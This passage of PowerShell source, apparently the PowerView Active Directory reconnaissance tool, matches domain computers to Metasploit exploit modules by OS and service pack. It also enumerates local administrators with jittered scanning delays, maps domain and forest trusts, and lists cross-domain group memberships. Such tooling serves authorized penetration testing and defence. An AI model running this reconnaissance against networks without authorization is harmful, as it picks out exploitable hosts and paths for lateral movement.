    $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  

    
    Write-Verbose "[*] Checking computers for vulnerable OS and SP levels..."

    
    
    

    
    $TableVulnComputers = New-Object System.Data.DataTable 
    $Null = $TableVulnComputers.Columns.Add('ComputerName')
    $Null = $TableVulnComputers.Columns.Add('OperatingSystem')
    $Null = $TableVulnComputers.Columns.Add('ServicePack')
    $Null = $TableVulnComputers.Columns.Add('LastLogon')
    $Null = $TableVulnComputers.Columns.Add('MsfModule')
    $Null = $TableVulnComputers.Columns.Add('CVE')

    
    $TableExploits | ForEach-Object {
                 
        $ExploitOS = $_.OperatingSystem
        $ExploitSP = $_.ServicePack
        $ExploitMsf = $_.MsfModule
        $ExploitCVE = $_.CVE

        
        $TableAdsComputers | ForEach-Object {
            
            $AdsHostname = $_.Hostname
            $AdsOS = $_.OperatingSystem
            $AdsSP = $_.ServicePack                                                        
            $AdsLast = $_.LastLogon
            
            
            if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ) {                    
                
                $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,$AdsLast,$ExploitMsf,$ExploitCVE)
            }
        }
    }
    
    
    $VulnComputer = $TableVulnComputers | Select-Object ComputerName -Unique | Measure-Object
    $VulnComputerCount = $VulnComputer.Count

    if ($VulnComputer.Count -gt 0) {
        
        Write-Verbose "[+] Found $VulnComputerCount potentially vulnerable systems!"
        $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose "[-] No vulnerable systems were found."
    }
}


function Invoke-EnumerateLocalAdmin {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $TrustGroups,

        [Switch]
        $DomainOnly,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Switch]
        $API
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdmin with delay of $Delay"

        
        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }

            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
            
            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }

        
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }

        if($TrustGroups) {
            
            Write-Verbose "Determining domain trust groups"

            
            $TrustGroupNames = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDs = $TrustGroupNames | ForEach-Object { 
                
                
                Get-NetGroup -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch "S-1-5-32-544" } | ForEach-Object { $_.objectsid }
            }

            
            $DomainSID = Get-DomainSID -Domain $Domain -DomainController $DomainController
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs, $API, $DomainOnly)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                if($API) {
                    $LocalAdmins = Get-NetLocalGroup -ComputerName $ComputerName -API
                }
                else {
                    $LocalAdmins = Get-NetLocalGroup -ComputerName $ComputerName
                }

                
                if($DomainSID) {
                    
                    $LocalSID = ($LocalAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"
                    Write-Verbose "LocalSid for $ComputerName : $LocalSID"
                    
                    
                    $LocalAdmins = $LocalAdmins | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
                }

                if($DomainOnly) {
                    $LocalAdmins = $LocalAdmins | Where-Object {$_.IsDomain}
                }

                if($LocalAdmins -and ($LocalAdmins.Length -ne 0)) {
                    
                    if($OutFile) {
                        $LocalAdmins | Export-PowerViewCSV -OutFile $OutFile
                    }
                    else {
                        
                        $LocalAdmins
                    }
                }
                else {
                    Write-Verbose "[!] No users returned from $ComputerName"
                }
            }
        }
    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = $DomainSID
                'TrustGroupsSIDs' = $TrustGroupsSIDs
            }

            
            if($API) {
                $ScriptParams['API'] = $True
            }

            if($DomainOnly) {
                $ScriptParams['DomainOnly'] = $True
            }
         
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"

                $ScriptArgs = @($Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs, $API, $DomainOnly)

                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $ScriptArgs
            }
        }
    }
}








function Get-NetDomainTrust {


    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $API,

        [Switch]
        $LDAP,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'non_transitive'
            [uint32]'0x00000002' = 'uplevel_only'
            [uint32]'0x00000004' = 'quarantined_domain'
            [uint32]'0x00000008' = 'forest_transitive'
            [uint32]'0x00000010' = 'cross_organization'
            [uint32]'0x00000020' = 'within_forest'
            [uint32]'0x00000040' = 'treat_as_external'
            [uint32]'0x00000080' = 'trust_uses_rc4_encryption'
            [uint32]'0x00000100' = 'trust_uses_aes_keys'
            [uint32]'0x00000200' = 'cross_organization_no_tgt_delegation'
            [uint32]'0x00000400' = 'pim_trust'
        }
    }

    process {

        if(-not $Domain) {
            
            $SourceDomain = (Get-NetDomain -Credential $Credential).Name
        }
        else {
            $SourceDomain = $Domain
        }

        if($LDAP -or $ADSPath) {

            $TrustSearcher = Get-DomainSearcher -Domain $SourceDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -ADSpath $ADSpath

            $SourceSID = Get-DomainSID -Domain $SourceDomain -DomainController $DomainController

            if($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                $Results = $TrustSearcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject
                    
                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'SourceSID' $SourceSID
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $DomainTrust | Add-Member Noteproperty 'TargetSID' $TargetSID
                    $DomainTrust | Add-Member Noteproperty 'ObjectGuid' "{$ObjectGuid}"
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust.PSObject.TypeNames.Add('PowerView.DomainTrustLDAP')
                    $DomainTrust
                }
                $Results.dispose()
                $TrustSearcher.dispose()
            }
        }
        elseif($API) {
            if(-not $DomainController) {
                $DomainController = Get-NetDomainController -Credential $Credential -Domain $SourceDomain | Select-Object -First 1 | Select-Object -ExpandProperty Name
            }

            if($DomainController) {
                
                $PtrInfo = [IntPtr]::Zero

                
                $Flags = 63
                $DomainCount = 0

                
                $Result = $Netapi32::DsEnumerateDomainTrusts($DomainController, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

                
                $Offset = $PtrInfo.ToInt64()

                
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                    
                    for ($i = 0; ($i -lt $DomainCount); $i++) {
                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ""
                        $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if($Result -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $DomainTrust = New-Object PSObject
                            $DomainTrust | Add-Member Noteproperty 'SourceDomain' $SourceDomain
                            $DomainTrust | Add-Member Noteproperty 'SourceDomainController' $DomainController
                            $DomainTrust | Add-Member Noteproperty 'NetbiosDomainName' $Info.NetbiosDomainName
                            $DomainTrust | Add-Member Noteproperty 'DnsDomainName' $Info.DnsDomainName
                            $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                            $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                            $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                            $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                            $DomainTrust | Add-Member Noteproperty 'DomainSid' $SidString
                            $DomainTrust | Add-Member Noteproperty 'DomainGuid' $Info.DomainGuid
                            $DomainTrust.PSObject.TypeNames.Add('PowerView.APIDomainTrust')
                            $DomainTrust
                        }
                    }
                    
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                Write-Verbose "Could not retrieve domain controller for $Domain"
            }
        }
        else {
            
            $FoundDomain = Get-NetDomain -Domain $Domain -Credential $Credential
            if($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Add('PowerView.DomainTrust')
                    $_
                }
            }
        }
    }
}


function Get-NetForestTrust {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    process {
        $FoundForest = Get-NetForest -Forest $Forest -Credential $Credential

        if($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Add('PowerView.ForestTrust')
                $_
            }
        }
    }
}


function Find-ForeignUser {


    [CmdletBinding()]
    param(
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-ForeignUser {
        
        param(
            [String]
            $UserName,

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if ($Domain) {
            
            $DistinguishedDomainName = "DC=" + $Domain -replace '\.',',DC='
        }
        else {
            $DistinguishedDomainName = [String] ([adsi]'').distinguishedname
            $Domain = $DistinguishedDomainName -replace 'DC=','' -replace ',','.'
        }

        Get-NetUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize -Filter '(memberof=*)' | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf("DC=")
                if($Index) {
                    
                    $GroupDomain = $($Membership.substring($Index)) -replace 'DC=','' -replace ',','.'
                    
                    if ($GroupDomain.CompareTo($Domain)) {
                        
                        $GroupName = $Membership.split(",")[0].split("=")[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $Domain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDN' $Membership
                        $ForeignUser
                    }
                }
            }
        }
    }

    if ($Recurse) {
        
        if($LDAP -or $DomainController) {
            $DomainTrusts = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $DomainTrusts = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($DomainTrust in $DomainTrusts) {
            
            Write-Verbose "Enumerating trust groups in domain $DomainTrust"
            Get-ForeignUser -Domain $DomainTrust -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        Get-ForeignUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}


function Find-ForeignGroup {


    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-ForeignGroup {
        param(
            [String]
            $GroupName = '*',

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if(-not $Domain) {
            $Domain = (Get-NetDomain).Name
        }

        $DomainDN = "DC=$($Domain.Replace('.', ',DC='))"
        Write-Verbose "DomainDN: $DomainDN"

        
        $ExcludeGroups = @("Users", "Domain Users", "Guests")

        
        Get-NetGroup -GroupName $GroupName -Filter '(member=*)' -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {
            
            -not ($ExcludeGroups -contains $_.samaccountname) } | ForEach-Object {
                
                $GroupName = $_.samAccountName

                $_.member | ForEach-Object {
                    
                    
                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.substring($_.IndexOf("DC="))))) {

                        $UserDomain = $_.subString($_.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]

                        $ForeignGroupUser = New-Object PSObject
                        $ForeignGroupUser | Add-Member Noteproperty 'GroupDomain' $Domain
                        $ForeignGroupUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignGroupUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignGroupUser | Add-Member Noteproperty 'UserName' $UserName
                        $ForeignGroupUser | Add-Member Noteproperty 'UserDN' $_
                        $ForeignGroupUser
                    }
                }
        }
    }

    if ($Recurse) {
        
        if($LDAP -or $DomainController) {
            $DomainTrusts = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $DomainTrusts = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($DomainTrust in $DomainTrusts) {
            
            Write-Verbose "Enumerating trust groups in domain $DomainTrust"
            Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}


function Find-ManagedSecurityGroups {


    
    Get-NetGroup -FullData -Filter '(managedBy=*)' | Select-Object -Unique distinguishedName,managedBy,cn | ForEach-Object {

        
        $group_manager = Get-ADObject -ADSPath $_.managedBy | Select-Object cn,distinguishedname,name,samaccounttype,samaccountname

        
        $results_object = New-Object -TypeName PSObject -Property @{
            'GroupCN' = $_.cn
            'GroupDN' = $_.distinguishedname
            'ManagerCN' = $group_manager.cn
            'ManagerDN' = $group_manager.distinguishedName
            'ManagerSAN' = $group_manager.samaccountname
            'ManagerType' = ''
            'CanManagerWrite' = $FALSE
        }

        
        if ($group_manager.samaccounttype -eq 0x10000000) {
            $results_object.ManagerType = 'Group'
        } elseif ($group_manager.samaccounttype -eq 0x30000000) {
            $results_object.ManagerType = 'User'
        }

        
        $xacl = Get-ObjectAcl -ADSPath $_.distinguishedname -Rights WriteMembers

        
        if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AccessControlType -eq 'Allow' -and $xacl.IdentityReference.Value.Contains($group_manager.samaccountname)) {
            $results_object.CanManagerWrite = $TRUE
        }
        $results_object
    }
}


function Invoke-MapDomainTrust {

    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    
    $SeenDomains = @{}

    
    $Domains = New-Object System.Collections.Stack

    
    $CurrentDomain = (Get-NetDomain -Credential $Credential).Name
    $Domains.push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        
        if ($Domain -and ($Domain.Trim() -ne "") -and (-not $SeenDomains.ContainsKey($Domain))) {
            
            Write-Verbose "Enumerating trusts for domain '$Domain'"

            
            $Null = $SeenDomains.add($Domain, "")

            try {
                
                if($LDAP -or $DomainController) {
                    $Trusts = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize -Credential $Credential
                }
                else {
                    $Trusts = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize -Credential $Credential
                }

                if($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                
                if(-not ($LDAP -or $DomainController) ) {
                    $Trusts += Get-NetForestTrust -Forest $Domain -Credential $Credential
                }

                if ($Trusts) {
                    if($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    
                    ForEach ($Trust in $Trusts) {
                        if($Trust.SourceName -and $Trust.TargetName) {
                            $SourceDomain = $Trust.SourceName
                            $TargetDomain = $Trust.TargetName
                            $TrustType = $Trust.TrustType
                            $TrustDirection = $Trust.TrustDirection
                            $ObjectType = $Trust.PSObject.TypeNames | Where-Object {$_ -match 'PowerView'} | Select-Object -First 1

                            
                            $Null = $Domains.Push($TargetDomain)

                            
                            $DomainTrust = New-Object PSObject
                            $DomainTrust | Add-Member Noteproperty 'SourceDomain' "$SourceDomain"
                            $DomainTrust | Add-Member Noteproperty 'SourceSID' $Trust.SourceSID
                            $DomainTrust | Add-Member Noteproperty 'TargetDomain' "$TargetDomain"
                            $DomainTrust | Add-Member Noteproperty 'TargetSID' $Trust.TargetSID
                            $DomainTrust | Add-Member Noteproperty 'TrustType' "$TrustType"
                            $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$TrustDirection"
                            $DomainTrust.PSObject.TypeNames.Add($ObjectType)
                            $DomainTrust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[!] Error: $_"
            }
        }
    }
}











$Mod = New-InMemoryModule -ModuleName Win32


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr]))
)


$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}


$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}


$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}


$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}


$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}


$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
